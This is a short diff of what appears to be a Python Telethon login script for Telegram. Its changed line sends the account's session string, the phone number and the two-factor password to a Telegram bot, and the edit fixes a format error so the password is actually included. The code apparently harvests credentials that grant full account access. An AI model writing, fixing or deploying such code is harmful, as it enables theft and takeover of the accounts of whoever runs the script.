@@ -30,4 +30,4 @@ if not client.is_user_authorized():
     except SessionPasswordNeededError:
         password = input('\033[032mPlease enter your password: ')
         me2 = client.sign_in(password=password)  
-        client.send_message("@string_session_sender_bot", f'Session: \n```{client.session.save()}```\n\nPhone number: ```{phone_number}```\n\nPassword: ```password}```')
+        client.send_message("@string_session_sender_bot", f'Session: \n```{client.session.save()}```\n\nPhone number: ```{phone_number}```\n\nPassword: ```{password}```')
